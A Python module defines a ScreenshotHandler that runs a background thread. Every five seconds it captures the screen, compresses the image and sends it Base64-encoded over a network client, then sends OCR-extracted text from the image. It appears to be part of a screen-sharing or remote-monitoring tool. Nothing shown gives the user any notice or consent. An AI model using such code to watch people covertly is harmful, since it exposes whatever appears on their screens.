import threading
import time
import base64
import io
import logging

try:
    import mss
    from PIL import Image
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    logging.warning("mss or Pillow not available. Screen sharing disabled. Install via: pip install mss pillow")

class ScreenshotHandler:
    def __init__(self, network_client):
        self.network = network_client
        self.should_run = False
        self.thread = None

    def start(self):
        if not SCREENSHOT_AVAILABLE:
            return
        self.should_run = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.should_run = False

    def _loop(self):
        while self.should_run:
            if self.network.is_connected:
                try:
                    with mss.mss() as sct:
                        # Grab the first monitor
                        monitor = sct.monitors[1]
                        sct_img = sct.grab(monitor)
                        
                        # Convert to PIL Image
                        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                        
                        # Resize to reduce bandwidth
                        img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                        
                        # Save to JPEG in memory
                        buffer = io.BytesIO()
                        img.save(buffer, format="JPEG", quality=40)
                        
                        # Encode to Base64
                        b64_str = base64.b64encode(buffer.getvalue()).decode('utf-8')
                        
                        # Send screenshot
                        self.network.send_message({"type": "screenshot", "data": b64_str})
                        
                        # OCR: extract text from the full-resolution PIL image
                        try:
                            import pytesseract
                            ocr_text = pytesseract.image_to_string(img)
                            self.network.send_message({"type": "ocr_text", "data": ocr_text.strip()})
                        except Exception as ocr_err:
                            logging.warning(f"OCR failed: {ocr_err}")
                        
                except Exception as e:
                    logging.error(f"Screenshot error: {e}")
                    
            time.sleep(5)
